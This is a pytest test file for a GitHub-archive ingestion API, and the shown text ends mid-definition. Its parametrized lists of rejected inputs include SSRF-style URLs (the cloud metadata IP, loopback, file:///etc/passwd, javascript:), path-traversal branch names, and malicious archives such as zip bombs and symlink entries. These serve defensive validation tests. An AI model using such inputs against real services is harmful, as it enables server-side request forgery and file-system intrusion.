"""Public GitHub repository ingestion tests.

No test contacts the internet: GitHub is mocked with respx (unmatched requests fail), and an
autouse guard blocks DNS/connections to anything but loopback and forbids subprocesses.
API tests run against a dedicated, already-migrated throwaway test database
(TEST_DATABASE_URL, name ending in "_test") inside rolled-back transactions, with DATA_DIR
pointing at a per-test temporary directory.
"""

import asyncio
import hashlib
import os
import socket
import subprocess
import tempfile
import uuid
import zipfile
from collections.abc import AsyncIterator, Iterator
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

import httpx
import pytest
import respx
from sqlalchemy import select, update
from sqlalchemy.engine import make_url
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.pool import NullPool

from app.config import get_settings
from app.database import get_db
from app.main import app
from app.models import File, Repository, RepositoryStatus
from app.services import github as github_service
from app.services import ingestion as ingestion_service
from app.services.github import (
    GitHubError,
    GitHubRepository,
    archive_download_url,
    parse_github_repository_url,
    validate_branch,
    validate_download_url,
)
from tests.test_repository_ingestion import (
    _bomb,
    _files_under,
    _zip,
    _zip_raw_names,
    _zip_symlink,
)
from tests.test_worker import install_inline_worker

TEST_DATABASE_URL = os.environ.get("TEST_DATABASE_URL")
requires_db = pytest.mark.skipif(
    not TEST_DATABASE_URL,
    reason="set TEST_DATABASE_URL to a dedicated, already-migrated test database",
)

PASSWORD = "test-only-Passw0rd!"
SOURCE_URL = "https://github.com/octo/demo"
ARCHIVE_URL = "https://github.com/octo/demo/archive/HEAD.zip"
CODELOAD_URL = "https://codeload.github.com/octo/demo/zip/refs/heads/main"
ARCHIVE = {
    "demo-main/README.md": b"# demo\n",
    "demo-main/src/app.py": b"print('hello')\n",
    "demo-main/src/lib/util.py": b"def util():\n    return 1\n",
}
LOOPBACK = {"127.0.0.1", "localhost", "::1"}


# --- Guards: no real network, no subprocesses --------------------------------------------


@dataclass
class Guard:
    network: list[str] = field(default_factory=list)
    subprocesses: list[Any] = field(default_factory=list)


@pytest.fixture(autouse=True)
def guard(monkeypatch: pytest.MonkeyPatch) -> Iterator[Guard]:
    recorded = Guard()
    real_getaddrinfo = socket.getaddrinfo
    real_connect = socket.socket.connect

    def guarded_getaddrinfo(host: Any, *args: Any, **kwargs: Any) -> Any:
        name = host.decode() if isinstance(host, bytes) else str(host)
        if name not in LOOPBACK:
            recorded.network.append(name)
            raise OSError("network access is disabled in tests")
        return real_getaddrinfo(host, *args, **kwargs)

    def guarded_connect(sock: socket.socket, address: Any) -> Any:
        host = address[0] if isinstance(address, tuple) else str(address)
        if host not in LOOPBACK:
            recorded.network.append(host)
            raise OSError("network access is disabled in tests")
        return real_connect(sock, address)

    def forbidden(*args: Any, **kwargs: Any) -> Any:
        recorded.subprocesses.append(args)
        raise AssertionError("subprocess execution is forbidden")

    monkeypatch.setattr(socket, "getaddrinfo", guarded_getaddrinfo)
    monkeypatch.setattr(socket.socket, "connect", guarded_connect)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    monkeypatch.setattr(os, "popen", forbidden)
    monkeypatch.setattr(asyncio, "create_subprocess_exec", forbidden)
    monkeypatch.setattr(asyncio, "create_subprocess_shell", forbidden)
    yield recorded
    assert recorded.network == [], f"unexpected network access: {recorded.network}"
    assert recorded.subprocesses == [], "unexpected subprocess execution"


# Mocked DNS: fixed public answers. Requests are made to these (validated) addresses.
GITHUB_IP = "140.82.112.3"
CODELOAD_IP = "140.82.112.10"
PUBLIC_DNS = {"github.com": [GITHUB_IP], "codeload.github.com": [CODELOAD_IP]}
REAL_RESOLVE_HOST = github_service.resolve_host


@dataclass
class FakeDNS:
    answers: dict[str, list[str]]
    lookups: list[str] = field(default_factory=list)
    events: list[str] = field(default_factory=list)


@pytest.fixture(autouse=True)
def dns(monkeypatch: pytest.MonkeyPatch) -> FakeDNS:
    fake = FakeDNS(answers={host: list(ips) for host, ips in PUBLIC_DNS.items()})

    async def fake_resolve_host(host: str) -> list[str]:
        fake.lookups.append(host)
        fake.events.append(f"dns:{host}")
        if host not in fake.answers:
            raise socket.gaierror("mocked: unknown host")
        return list(fake.answers[host])

    monkeypatch.setattr(github_service, "resolve_host", fake_resolve_host)
    return fake


def pinned(url: str) -> str:
    """The URL actually requested: the logical host replaced by its mocked DNS address."""
    parts = urlsplit(url)
    address = PUBLIC_DNS.get(str(parts.hostname), [str(parts.hostname)])[0]
    netloc = f"[{address}]" if ":" in address else address
    return parts._replace(netloc=netloc).geturl()


def _logical(request: httpx.Request) -> str:
    """Rebuild the logical GitHub URL of a pinned request from its Host header."""
    return f"https://{request.headers['host']}{request.url.raw_path.decode()}"


@pytest.fixture
def github() -> Iterator[respx.MockRouter]:
    # Any request that does not match a declared route fails the test.
    with respx.mock(assert_all_mocked=True, assert_all_called=False) as router:
        yield router


class Stream(httpx.AsyncByteStream):
    """A realistic streamed body that records how much of it was consumed."""

    def __init__(self, chunks: list[bytes], delay: float = 0.0) -> None:
        self.chunks = chunks
        self.delay = delay
        self.sent = 0

    async def __aiter__(self) -> AsyncIterator[bytes]:
        for chunk in self.chunks:
            if self.delay:
                await asyncio.sleep(self.delay)
            self.sent += 1
            yield chunk


def _serve(router: respx.MockRouter, body: bytes | Stream, **headers: str) -> respx.Route:
    router.get(pinned(ARCHIVE_URL)).mock(
        return_value=httpx.Response(302, headers={"Location": CODELOAD_URL})
    )
    if isinstance(body, Stream):
        response = httpx.Response(200, headers=headers, stream=body)
    else:
        response = httpx.Response(200, headers={"Content-Type": "application/zip"}, content=body)
    return router.get(pinned(CODELOAD_URL)).mock(return_value=response)


def _requested_hosts(router: respx.MockRouter) -> set[str]:
    """Logical hosts requested (the Host header; connections go to the validated IP)."""
    return {call.request.headers["host"] for call in router.calls}


# --- URL validation (no database, no network) --------------------------------------------


@pytest.mark.parametrize(
    ("url", "owner", "name"),
    [
        ("https://github.com/octo/demo", "octo", "demo"),
        ("https://github.com/octo/demo/", "octo", "demo"),
        ("https://github.com/my-org/my.repo_name-2", "my-org", "my.repo_name-2"),
        ("HTTPS://GitHub.com/Octo/Demo", "Octo", "Demo"),
    ],
)
def test_valid_github_urls(url: str, owner: str, name: str) -> None:
    assert parse_github_repository_url(url) == GitHubRepository(owner, name)


INVALID_URLS = [
    # scheme / protocol
    "http://github.com/octo/demo",
    "ftp://github.com/octo/demo",
    "file:///etc/passwd",
    "data:text/plain,hello",
    "javascript:alert(1)",
    "git://github.com/octo/demo.git",
    "ssh://git@github.com/octo/demo.git",
    "git@github.com:octo/demo.git",
    "github.com/octo/demo",
    # host
    "https://evil.example/octo/demo",
    "https://github.com.evil.example/octo/demo",
    "https://evil.example/github.com/octo/demo",
    "https://www.github.com/octo/demo",
    "https://gist.github.com/octo/abc123",
    "https://raw.githubusercontent.com/octo/demo/main/README.md",
    "https://codeload.github.com/octo/demo/zip/refs/heads/main",
    "https://github.com./octo/demo",
    "https://localhost/octo/demo",
    "https://127.0.0.1/octo/demo",
    "https://10.0.0.5/octo/demo",
    "https://192.168.1.10/octo/demo",
    "https://169.254.169.254/latest/meta-data",
    "https://[::1]/octo/demo",
    "https://[::ffff:127.0.0.1]/octo/demo",
    # userinfo / port / fragment / query
    "https://user:pass@github.com/octo/demo",
    "https://user@github.com/octo/demo",
    "https://github.com@evil.example/octo/demo",
    "https://github.com:8080/octo/demo",
    "https://github.com:443/octo/demo",
    "https://github.com/octo/demo#readme",
    "https://evil.example#@github.com/octo/demo",
    "https://github.com/octo/demo?tab=readme",
    # path structure
    "https://github.com/",
    "https://github.com/octo",
    "https://github.com/octo/demo/tree/main",
    "https://github.com/octo/demo/archive/refs/heads/main.zip",
    "https://github.com/octo/demo/releases/download/v1/app.zip",
    "https://github.com/octo/demo.git",
    "https://github.com/../demo",
    "https://github.com/octo/..",
    "https://github.com/-octo/demo",
    "https://github.com/octo/demo%2F..",
    "https://github.com/octo//demo",
    "https://github.com\\octo\\demo",
    " https://github.com/octo/demo",
    "https://github.com/octo/demo\n",
    "https://github.com/oc\tto/demo",
]


@pytest.mark.parametrize("url", INVALID_URLS)
def test_invalid_github_urls_rejected(url: str) -> None:
    with pytest.raises(GitHubError) as excinfo:
        parse_github_repository_url(url)
    assert (excinfo.value.status_code, excinfo.value.detail) == (
        422,
        "Invalid GitHub repository URL",
    )


@pytest.mark.parametrize("url", [None, ""])
def test_missing_github_url(url: str | None) -> None:
    with pytest.raises(GitHubError) as excinfo:
        parse_github_repository_url(url)
    assert (excinfo.value.status_code, excinfo.value.detail) == (
        422,
        "GitHub repository URL is required",
    )


@pytest.mark.parametrize(
    ("branch", "suffix"),
    [
        (None, "archive/HEAD.zip"),
        ("main", "archive/refs/heads/main.zip"),
        ("feature/new-ui", "archive/refs/heads/feature/new-ui.zip"),
        ("release-1.2.3", "archive/refs/heads/release-1.2.3.zip"),
    ],
)
def test_archive_url_built_from_validated_parts(branch: str | None, suffix: str) -> None:
    url = archive_download_url(GitHubRepository("octo", "demo"), branch)
    assert url == f"https://github.com/octo/demo/{suffix}"
    assert urlsplit(url).hostname == "github.com"


@pytest.mark.parametrize(
    "branch",
    [
        "../../evil",
        "a/../b",
        "a..b",
        "/main",
        "main/",
        "-main",
        "a//b",
        ".hidden",
        "a/.b",
        "x.lock",
        "main.",
        "has space",
        "a\x00b",
        "a:b",
        "@{u}",
        "https://evil.example",
        "%2e%2e",
        "a?b",
        "a#b",
        "a\\b",
        "x" * 256,
    ],
)
def test_unsafe_branches_rejected(branch: str) -> None:
    with pytest.raises(GitHubError) as excinfo:
        validate_branch(branch)
    assert (excinfo.value.status_code, excinfo.value.detail) == (
        422,
        "Unsupported default branch name",
    )


@pytest.mark.parametrize(
    "url",
    [
        "https://codeload.github.com/octo/demo/zip/refs/heads/main",
        "https://github.com/octo/demo/archive/HEAD.zip",
    ],
)
def test_allowed_download_hosts(url: str) -> None:
    assert validate_download_url(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "http://codeload.github.com/octo/demo/zip/main",
        "https://evil.example/archive.zip",
        "https://codeload.github.com.evil.example/x",
        "https://user@codeload.github.com/x",
        "https://codeload.github.com:8443/x",
        "https://127.0.0.1/x",
        "https://objects.githubusercontent.com/x",
        "file:///etc/passwd",
        "https://codeload.github.com/x#frag",
    ],
)
def test_disallowed_download_hosts(url: str) -> None:
    with pytest.raises(GitHubError) as excinfo:
        validate_download_url(url)
    assert excinfo.value.status_code == 502


# --- API fixtures ------------------------------------------------------------------------


@pytest.fixture
async def db_session() -> AsyncIterator[AsyncSession]:
    assert TEST_DATABASE_URL
    url = make_url(TEST_DATABASE_URL)
    if not (url.database or "").endswith("_test"):
        pytest.fail("refusing to use TEST_DATABASE_URL: database name must end with '_test'")
    engine = create_async_engine(url, poolclass=NullPool)
    try:
        async with engine.connect() as conn:
            transaction = await conn.begin()
            # Commits inside the app only release a savepoint; everything is rolled back below.
            session = AsyncSession(
                bind=conn, join_transaction_mode="create_savepoint", expire_on_commit=False
            )
            try:
                yield session
            finally:
                await session.close()
                await transaction.rollback()
    finally:
        await engine.dispose()


@pytest.fixture
def data_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    path = tmp_path / "data"
    monkeypatch.setattr(get_settings(), "data_dir", path)
    return path


@pytest.fixture
async def client(
    db_session: AsyncSession, data_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> AsyncIterator[httpx.AsyncClient]:
    async def override_get_db() -> AsyncIterator[AsyncSession]:
        yield db_session

    # Queued jobs run immediately with the real worker logic (ingestion is asynchronous).
    install_inline_worker(monkeypatch, db_session)
    app.dependency_overrides[get_db] = override_get_db
    try:
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
            yield c
    finally:
        app.dependency_overrides.pop(get_db, None)


async def _job_error(
    client: httpx.AsyncClient, owner: "Owner", response: httpx.Response
) -> str | None:
    """For a queued (202) ingestion whose worker run failed, return the job's error."""
    assert response.status_code == 202, response.text
    body = response.json()
    job = await client.get(
        f"/api/v1/projects/{owner.project_id}/repositories/{body['repository_id']}"
        f"/jobs/{body['job_id']}",
        headers=owner.headers,
    )
    assert job.status_code == 200
    assert job.json()["status"] == "failed"
    return job.json()["error_message"]


@dataclass
class Owner:
    headers: dict[str, str]
    project_id: str
    repository_id: str


async def _repository(
    client: httpx.AsyncClient, headers: dict[str, str], project_id: str, **fields: object
) -> str:
    body = {"name": "demo", "source_type": "github", "source_url": SOURCE_URL, **fields}
    response = await client.post(
        f"/api/v1/projects/{project_id}/repositories", json=body, headers=headers
    )
    assert response.status_code == 201, response.text
    return str(response.json()["id"])


async def _owner(client: httpx.AsyncClient, email: str, **fields: object) -> Owner:
    registered = await client.post(
        "/api/v1/auth/register", json={"email": email, "password": PASSWORD}
    )
    assert registered.status_code == 201
    login = await client.post("/api/v1/auth/login", json={"email": email, "password": PASSWORD})
    headers = {"Authorization": f"Bearer {login.json()['access_token']}"}
    project = (await client.post("/api/v1/projects", json={"name": "P"}, headers=headers)).json()
    repository_id = await _repository(client, headers, project["id"], **fields)
    return Owner(headers, project["id"], repository_id)


@pytest.fixture
async def alice(client: httpx.AsyncClient) -> Owner:
    return await _owner(client, "alice@example.com")


@pytest.fixture
async def bob(client: httpx.AsyncClient) -> Owner:
    return await _owner(client, "bob@example.com")


def _url(project_id: str, repository_id: str) -> str:
    return f"/api/v1/projects/{project_id}/repositories/{repository_id}/ingest"


async def _ingest(
    client: httpx.AsyncClient,
    owner: Owner,
    project_id: str | None = None,
    repository_id: str | None = None,
) -> httpx.Response:
    return await client.post(
        _url(project_id or owner.project_id, repository_id or owner.repository_id),
        headers=owner.headers,
    )


async def _status(db: AsyncSession, repository_id: str) -> RepositoryStatus:
    value = await db.scalar(
        select(Repository.status).where(Repository.id == uuid.UUID(repository_id))
    )
    assert value is not None
    return value


async def _rows(db: AsyncSession, repository_id: str) -> dict[str, File]:
    rows = await db.scalars(select(File).where(File.repository_id == uuid.UUID(repository_id)))
    return {f.path: f for f in rows}


def _storage(data_dir: Path, repository_id: str) -> Path:
    return data_dir / "repositories" / repository_id


def _leftovers(data_dir: Path) -> list[str]:
    root = data_dir / "repositories"
    return sorted(p.name for p in root.iterdir() if p.name.startswith(".")) if root.exists() else []


@pytest.fixture
def temp_downloads(monkeypatch: pytest.MonkeyPatch) -> list[Any]:
    """Record every temporary download file so tests can check it was closed and removed."""
    created: list[Any] = []
    real = tempfile.TemporaryFile

    def tracking(*args: Any, **kwargs: Any) -> Any:
        handle = real(*args, **kwargs)
        created.append(handle)
        return handle

    monkeypatch.setattr(ingestion_service.tempfile, "TemporaryFile", tracking)
    return created


def _assert_downloads_cleaned(created: list[Any]) -> None:
    for handle in created:
        assert handle.closed
        name = getattr(handle, "name", None)
        if isinstance(name, str):  # named on Windows; anonymous (an fd number) on POSIX
            assert not Path(name).exists()


async def _assert_failed_cleanly(
    db: AsyncSession, data_dir: Path, owner: Owner, created: list[Any] | None = None
) -> None:
    assert await _status(db, owner.repository_id) == RepositoryStatus.FAILED
    assert await _rows(db, owner.repository_id) == {}
    assert not _storage(data_dir, owner.repository_id).exists()
    assert _leftovers(data_dir) == []
    if created is not None:
        _assert_downloads_cleaned(created)


# --- API: successful ingestion -----------------------------------------------------------


@requires_db
async def test_successful_github_ingestion(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    temp_downloads: list[Any],
) -> None:
    _serve(github, _zip(ARCHIVE))
    response = await _ingest(client, alice)
    assert response.status_code == 202
    assert set(response.json()) == {"job_id", "repository_id", "status"}
    assert (response.json()["repository_id"], response.json()["status"]) == (
        alice.repository_id,
        "pending",
    )

    assert [_logical(c.request) for c in github.calls] == [ARCHIVE_URL, CODELOAD_URL]
    assert _requested_hosts(github) <= {"github.com", "codeload.github.com"}
    assert all(c.request.headers["accept-encoding"] == "identity" for c in github.calls)
    assert all("authorization" not in c.request.headers for c in github.calls)

    rows = await _rows(db_session, alice.repository_id)
    assert set(rows) == set(ARCHIVE)
    for path, data in ARCHIVE.items():
        assert rows[path].sha256 == hashlib.sha256(data).hexdigest()
        assert (_storage(data_dir, alice.repository_id) / path).read_bytes() == data
    assert await _status(db_session, alice.repository_id) == RepositoryStatus.READY
    repository = await client.get(
        f"/api/v1/projects/{alice.project_id}/repositories/{alice.repository_id}",
        headers=alice.headers,
    )
    assert repository.json()["source_url"] == SOURCE_URL  # stored value preserved
    assert _leftovers(data_dir) == []
    _assert_downloads_cleaned(temp_downloads)


@requires_db
async def test_default_branch_selects_archive_ref(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter
) -> None:
    repository_id = await _repository(
        client, alice.headers, alice.project_id, default_branch="feature/new-ui"
    )
    branch_url = "https://github.com/octo/demo/archive/refs/heads/feature/new-ui.zip"
    github.get(pinned(branch_url)).mock(return_value=httpx.Response(200, content=_zip(ARCHIVE)))
    response = await _ingest(client, alice, repository_id=repository_id)
    assert response.status_code == 202
    assert [_logical(c.request) for c in github.calls] == [branch_url]


@requires_db
async def test_github_ingestion_ignores_any_request_body(
    client: httpx.AsyncClient, db_session: AsyncSession, alice: Owner, github: respx.MockRouter
) -> None:
    _serve(github, _zip(ARCHIVE))
    response = await client.post(
        _url(alice.project_id, alice.repository_id),
        files={"file": ("other.zip", _zip({"injected.txt": b"x"}), "application/zip")},
        headers=alice.headers,
    )
    assert response.status_code == 202
    assert set(await _rows(db_session, alice.repository_id)) == set(ARCHIVE)


@requires_db
async def test_zip_source_type_still_uses_upload(
    client: httpx.AsyncClient, db_session: AsyncSession, alice: Owner, github: respx.MockRouter
) -> None:
    zip_repository = await _repository(
        client, alice.headers, alice.project_id, source_type="zip", source_url=None
    )
    response = await client.post(
        _url(alice.project_id, zip_repository),
        files={"file": ("repo.zip", _zip({"a.txt": b"a"}), "application/zip")},
        headers=alice.headers,
    )
    assert response.status_code == 202
    assert set(await _rows(db_session, zip_repository)) == {"a.txt"}
    missing = await client.post(_url(alice.project_id, zip_repository), headers=alice.headers)
    assert missing.status_code == 415  # ZIP repositories still require a multipart upload
    assert github.calls.call_count == 0


@requires_db
async def test_successful_reingestion_replaces_files(
    client: httpx.AsyncClient, db_session: AsyncSession, data_dir: Path, alice: Owner,
    github: respx.MockRouter,
) -> None:
    route = _serve(github, _zip({"demo-main/old.txt": b"old", "demo-main/keep.txt": b"1"}))
    assert (await _ingest(client, alice)).status_code == 202
    route.mock(return_value=httpx.Response(200, content=_zip({"demo-main/keep.txt": b"2"})))
    response = await _ingest(client, alice)
    assert response.status_code == 202
    rows = await _rows(db_session, alice.repository_id)
    assert set(rows) == {"demo-main/keep.txt"}
    assert rows["demo-main/keep.txt"].sha256 == hashlib.sha256(b"2").hexdigest()
    assert _files_under(_storage(data_dir, alice.repository_id)) == {"demo-main/keep.txt"}


@requires_db
async def test_failed_reingestion_preserves_previous_files(
    client: httpx.AsyncClient, db_session: AsyncSession, data_dir: Path, alice: Owner,
    github: respx.MockRouter,
) -> None:
    route = _serve(github, _zip(ARCHIVE))
    assert (await _ingest(client, alice)).status_code == 202
    before = {p: f.sha256 for p, f in (await _rows(db_session, alice.repository_id)).items()}
    route.mock(return_value=httpx.Response(200, content=_zip_raw_names(["a", "../../evil"])))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "Archive contains an unsafe path"
    assert await _status(db_session, alice.repository_id) == RepositoryStatus.FAILED
    after = {p: f.sha256 for p, f in (await _rows(db_session, alice.repository_id)).items()}
    assert after == before
    assert _files_under(_storage(data_dir, alice.repository_id)) == set(ARCHIVE)
    assert _leftovers(data_dir) == []


# --- API: source validation happens before any network access ----------------------------


@requires_db
@pytest.mark.parametrize(
    "source_url",
    [
        "http://github.com/octo/demo",
        "https://evil.example/octo/demo",
        "https://github.com.evil.example/octo/demo",
        "https://user:pass@github.com/octo/demo",
        "https://github.com:8080/octo/demo",
        "https://github.com/octo/demo#x",
        "https://localhost/octo/demo",
        "https://127.0.0.1/octo/demo",
        "https://10.0.0.5/octo/demo",
        "https://169.254.169.254/latest/meta-data",
        "https://[::1]/octo/demo",
        "file:///etc/passwd",
        "git@github.com:octo/demo.git",
        "https://github.com/octo/demo/archive/refs/heads/main.zip",
    ],
)
async def test_invalid_source_url_rejected_without_network(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    alice: Owner,
    github: respx.MockRouter,
    source_url: str,
) -> None:
    repository_id = await _repository(client, alice.headers, alice.project_id, source_url=source_url)
    response = await _ingest(client, alice, repository_id=repository_id)
    assert response.status_code == 422
    assert response.json() == {"detail": "Invalid GitHub repository URL"}
    assert github.calls.call_count == 0
    assert await _status(db_session, repository_id) == RepositoryStatus.PENDING


@requires_db
async def test_missing_source_url_rejected(
    client: httpx.AsyncClient, db_session: AsyncSession, alice: Owner, github: respx.MockRouter
) -> None:
    repository_id = await _repository(client, alice.headers, alice.project_id, source_url=None)
    response = await _ingest(client, alice, repository_id=repository_id)
    assert response.status_code == 422
    assert response.json() == {"detail": "GitHub repository URL is required"}
    assert github.calls.call_count == 0
    assert await _status(db_session, repository_id) == RepositoryStatus.PENDING


@requires_db
async def test_unsafe_default_branch_rejected(
    client: httpx.AsyncClient, db_session: AsyncSession, alice: Owner, github: respx.MockRouter
) -> None:
    repository_id = await _repository(
        client, alice.headers, alice.project_id, default_branch="../../evil"
    )
    response = await _ingest(client, alice, repository_id=repository_id)
    assert response.status_code == 422
    assert response.json() == {"detail": "Unsupported default branch name"}
    assert github.calls.call_count == 0


# --- API: ownership ----------------------------------------------------------------------


@requires_db
async def test_cross_user_and_wrong_project_ingestion_not_found(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    alice: Owner,
    bob: Owner,
    github: respx.MockRouter,
) -> None:
    other_project = await client.post(
        "/api/v1/projects", json={"name": "Other"}, headers=alice.headers
    )
    attempts = [
        (bob.project_id, bob.repository_id),  # Bob's repository
        (alice.project_id, bob.repository_id),  # Alice's project, Bob's repository
        (other_project.json()["id"], alice.repository_id),  # wrong project
        (alice.project_id, str(uuid.uuid4())),  # nonexistent repository
        (str(uuid.uuid4()), alice.repository_id),  # nonexistent project
    ]
    for project_id, repository_id in attempts:
        response = await _ingest(client, alice, project_id=project_id, repository_id=repository_id)
        assert response.status_code == 404
        assert response.json() == {"detail": "Repository not found"}
    assert github.calls.call_count == 0
    assert await _status(db_session, bob.repository_id) == RepositoryStatus.PENDING
    assert await _status(db_session, alice.repository_id) == RepositoryStatus.PENDING


@requires_db
async def test_unauthenticated_and_invalid_uuid(
    client: httpx.AsyncClient, alice: Owner, github: respx.MockRouter
) -> None:
    anonymous = await client.post(_url(alice.project_id, alice.repository_id))
    assert anonymous.status_code == 401
    for project_id, repository_id in (("bad", alice.repository_id), (alice.project_id, "bad")):
        assert (await _ingest(client, alice, project_id, repository_id)).status_code == 422
    assert github.calls.call_count == 0


@requires_db
async def test_concurrent_ingestion_rejected(
    client: httpx.AsyncClient, db_session: AsyncSession, alice: Owner, github: respx.MockRouter
) -> None:
    await db_session.execute(
        update(Repository)
        .where(Repository.id == uuid.UUID(alice.repository_id))
        .values(status=RepositoryStatus.PROCESSING)
    )
    await db_session.commit()
    response = await _ingest(client, alice)
    assert response.status_code == 409
    assert response.json() == {"detail": "Repository ingestion is already in progress"}
    assert github.calls.call_count == 0


# --- API: downloaded archives go through the Step 10 security pipeline -------------------

MALICIOUS = {
    "not a zip (claims application/zip)": (b"<html>not a zip</html>", 400, "Invalid ZIP archive"),
    "traversal": (
        _zip_raw_names(["demo/ok.txt", "../../evil.txt"]),
        400,
        "Archive contains an unsafe path",
    ),
    "absolute": (_zip_raw_names(["/etc/evil"]), 400, "Archive contains an unsafe path"),
    "windows drive": (_zip_raw_names(["C:\\evil.txt"]), 400, "Archive contains an unsafe path"),
    "symlink": (_zip_symlink(), 400, "Archive contains a symbolic link"),
    "duplicate": (
        _zip_raw_names(["demo/a.txt", "demo/a.txt"]),
        400,
        "Archive contains duplicate or conflicting paths",
    ),
    "zip bomb": (_bomb(), 413, "Archive entry exceeds the compression ratio limit"),
}


@requires_db
@pytest.mark.parametrize("case", list(MALICIOUS))
async def test_malicious_downloaded_archives_rejected(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    tmp_path: Path,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    temp_downloads: list[Any],
    monkeypatch: pytest.MonkeyPatch,
    case: str,
) -> None:
    monkeypatch.setattr(get_settings(), "max_extracted_file_size_mb", 10)
    body, _, detail = MALICIOUS[case]
    _serve(github, body)
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == detail
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)
    assert _files_under(tmp_path) == set()  # nothing written anywhere


@requires_db
@pytest.mark.parametrize(
    ("setting", "value", "archive", "detail"),
    [
        (
            "max_archive_file_count",
            2,
            {f"demo/f{i}.txt": b"x" for i in range(3)},
            "Archive contains too many entries",
        ),
        (
            "max_extracted_size_mb",
            1,
            {"demo/a.bin": b"a" * 600_000, "demo/b.bin": b"b" * 600_000},
            "Archive exceeds the extracted size limit",
        ),
        (
            "max_extracted_file_size_mb",
            1,
            {"demo/big.bin": b"c" * (1024 * 1024 + 1)},
            "Archive contains a file that exceeds the size limit",
        ),
    ],
)
async def test_archive_limits_apply_to_downloads(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
    setting: str,
    value: int,
    archive: dict[str, bytes],
    detail: str,
) -> None:
    monkeypatch.setattr(get_settings(), setting, value)
    monkeypatch.setattr(get_settings(), "max_compression_ratio", 10_000)
    _serve(github, _zip(archive, zipfile.ZIP_STORED))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == detail
    await _assert_failed_cleanly(db_session, data_dir, alice)


# --- API: download size limits -----------------------------------------------------------

MIB = 1024 * 1024
CHUNK = b"\0" * (64 * 1024)


@requires_db
async def test_declared_oversized_content_length_rejected_before_body(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
    temp_downloads: list[Any],
) -> None:
    monkeypatch.setattr(get_settings(), "max_upload_size_mb", 1)
    stream = Stream([CHUNK] * 64)
    _serve(github, stream, **{"Content-Length": str(4 * MIB)})
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "Downloaded archive exceeds the size limit"
    assert stream.sent == 0  # body never consumed
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


@requires_db
async def test_stream_without_content_length_is_cut_off(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
    temp_downloads: list[Any],
) -> None:
    monkeypatch.setattr(get_settings(), "max_upload_size_mb", 1)
    stream = Stream([CHUNK] * 1600)  # 100 MiB if fully read
    _serve(github, stream)
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "Downloaded archive exceeds the size limit"
    assert stream.sent <= 1 * MIB // len(CHUNK) + 1  # stopped right after the limit
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


@requires_db
async def test_accurate_but_oversized_response_rejected(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(get_settings(), "max_upload_size_mb", 1)
    _serve(github, os.urandom(MIB + 1))
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == "Downloaded archive exceeds the size limit"
    await _assert_failed_cleanly(db_session, data_dir, alice)


@requires_db
async def test_understated_content_length_still_limited(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(get_settings(), "max_upload_size_mb", 1)
    stream = Stream([CHUNK] * 64)  # 4 MiB, while claiming 1 KiB
    _serve(github, stream, **{"Content-Length": "1024"})
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) in (
        "Downloaded archive exceeds the size limit",
        "Could not connect to GitHub",  # framing error
    )
    assert stream.sent <= 1 * MIB // len(CHUNK) + 1
    await _assert_failed_cleanly(db_session, data_dir, alice)


# --- API: GitHub/network failures --------------------------------------------------------


@requires_db
@pytest.mark.parametrize(
    ("status_code", "detail"),
    [
        (404, "GitHub repository not found"),
        (403, "GitHub denied access to the repository"),
        (401, "GitHub denied access to the repository"),
        (429, "GitHub rate limit exceeded; try again later"),
        (500, "GitHub returned an unexpected response"),
        (503, "GitHub returned an unexpected response"),
        (204, "GitHub returned an unexpected response"),
    ],
)
async def test_github_error_statuses_handled(
    client: httpx.AsyncClient,
    db_session: AsyncSession,
    data_dir: Path,
    alice: Owner,
    github: respx.MockRouter,
    temp_downloads: list[Any],
    status_code: int,
    detail: str,
) -> None:
    github.get(pinned(ARCHIVE_URL)).mock(
        return_value=httpx.Response(status_code, text="SECRET-GITHUB-BODY /internal/path")
    )
    response = await _ingest(client, alice)
    assert await _job_error(client, alice, response) == detail
    assert "SECRET-GITHUB-BODY" not in response.text  # upstream bodies are never relayed
    await _assert_failed_cleanly(db_session, data_dir, alice, temp_downloads)


@requires_db
@pytest.mark.parametrize(
    ("error", "detail"),
    [
        (httpx.ConnectTimeout("connect timed out"), "GitHub download timed out"),
        (httpx.ReadTimeout("read timed out"), "GitHub download timed out"),
        (httpx.ConnectError("connection refused"), "Could not connect to GitHub"),
        (httpx.RemoteProtocolError("peer closed"), "Could not connect to GitHub"),
    ],
)
async def test_network_failures_handled(
